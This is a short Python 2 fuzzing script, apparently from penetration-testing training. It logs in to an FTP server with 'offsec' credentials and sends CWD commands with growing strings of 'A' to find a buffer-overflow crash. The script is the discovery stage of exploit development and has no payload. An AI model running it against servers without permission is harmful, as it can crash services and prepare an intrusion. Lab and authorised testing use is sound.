#!/usr/bin/python
import sys
import socket

rhost = '192.168.1.100'

buffer = ["A"]
counter = 100
while len(buffer) <= 50:
  buffer.append("A" * counter)
  counter = counter + 200

for string in buffer:
    print '[-] Fuzzing: {}'.format(len(string))
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((rhost, 21))

        s.recv(2048)
        s.send('USER offsec\r\n')
        s.recv(2048)
        s.send('PASS offsec\r\n')
        s.recv(2048)
        s.send('CWD {}\r\n'.format(string))
        s.close()
    except socket.error as error:
        s.close()
        print error

